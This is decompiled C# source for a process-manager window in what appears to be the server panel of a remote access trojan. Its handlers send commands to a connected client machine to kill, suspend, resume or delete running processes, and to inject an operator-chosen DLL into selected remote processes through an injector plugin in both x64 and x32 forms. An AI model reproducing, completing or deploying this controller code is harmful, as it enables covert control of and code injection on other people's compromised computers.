using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000B6 RID: 182
	public partial class FormProcess : FormMaterial
	{
		// Token: 0x060005B1 RID: 1457 RVA: 0x00052C06 File Offset: 0x00050E06
		public FormProcess()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x060005B2 RID: 1458 RVA: 0x00052C28 File Offset: 0x00050E28
		private void FormProcess_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
			typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, this.dataGridView2, new object[]
			{
				true
			});
		}

		// Token: 0x060005B3 RID: 1459 RVA: 0x00052C90 File Offset: 0x00050E90
		private void ChangeScheme(object sender)
		{
			this.dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.dataGridView2.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x060005B4 RID: 1460 RVA: 0x00052CF1 File Offset: 0x00050EF1
		private void Closing1(object sender, EventArgs e)
		{
			if (this.client != null)
			{
				this.client.Disconnect();
			}
		}

		// Token: 0x060005B5 RID: 1461 RVA: 0x00052D06 File Offset: 0x00050F06
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client != null && !this.client.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x060005B6 RID: 1462 RVA: 0x00052D38 File Offset: 0x00050F38
		private int[] PidsSelected()
		{
			List<int> list = new List<int>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				list.Add((int)dataGridViewRow.Cells[1].Value);
			}
			return list.ToArray();
		}

		// Token: 0x060005B7 RID: 1463 RVA: 0x00052DB8 File Offset: 0x00050FB8
		private void killToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			foreach (int num in this.PidsSelected())
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"Kill",
					num
				}));
			}
		}

		// Token: 0x060005B8 RID: 1464 RVA: 0x00052E18 File Offset: 0x00051018
		private void killRemoveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			foreach (int num in this.PidsSelected())
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"KillRemove",
					num
				}));
			}
		}

		// Token: 0x060005B9 RID: 1465 RVA: 0x00052E78 File Offset: 0x00051078
		private void openDirectoryExplorerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			if (string.IsNullOrEmpty((string)this.dataGridView2.SelectedRows[0].Cells[2].Value))
			{
				return;
			}
			FormExplorer formExplorer = (FormExplorer)Application.OpenForms["Explorer:" + this.client.Hwid];
			if (formExplorer == null)
			{
				MessageBox.Show("Please open Explorer!");
				return;
			}
			formExplorer.client.Send(LEB128.Write(new object[]
			{
				"GetPath",
				Path.GetDirectoryName((string)this.dataGridView2.SelectedRows[0].Cells[2].Value)
			}));
		}

		// Token: 0x060005BA RID: 1466 RVA: 0x00052F48 File Offset: 0x00051148
		private void suspendProcessToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			foreach (int num in this.PidsSelected())
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"Suspend",
					num
				}));
			}
		}

		// Token: 0x060005BB RID: 1467 RVA: 0x00052FA8 File Offset: 0x000511A8
		private void resumeProcessToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			foreach (int num in this.PidsSelected())
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"Resume",
					num
				}));
			}
		}

		// Token: 0x060005BC RID: 1468 RVA: 0x00053008 File Offset: 0x00051208
		private void x64ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Injector.dll");
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Title = "Choose dll";
				openFileDialog.Filter = "Files(*.dll)|*.dll";
				openFileDialog.Multiselect = false;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					Task.Run(delegate()
					{
						this.parrent.Send(new object[]
						{
							"Invoke",
							checksum,
							LEB128.Write(new object[]
							{
								"InjectX64",
								Path.GetFileName(openFileDialog.FileName),
								File.ReadAllBytes(openFileDialog.FileName),
								string.Join<int>(";", this.PidsSelected())
							})
						});
					});
				}
			}
		}

		// Token: 0x060005BD RID: 1469 RVA: 0x000530B4 File Offset: 0x000512B4
		private void x32ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Injector.dll");
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Title = "Choose dll";
				openFileDialog.Filter = "Files(*.dll)|*.dll";
				openFileDialog.Multiselect = false;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					Task.Run(delegate()
					{
						this.parrent.Send(new object[]
						{
							"Invoke",
							checksum,
							LEB128.Write(new object[]
							{
								"InjectX32",
								Path.GetFileName(openFileDialog.FileName),
								File.ReadAllBytes(openFileDialog.FileName),
								string.Join<int>(";", this.PidsSelected())
							})
						});
					});
				}
			}
		}

		// Token: 0x04000481 RID: 1153
		public Clients client;

		// Token: 0x04000482 RID: 1154
		public Clients parrent;
	}
}
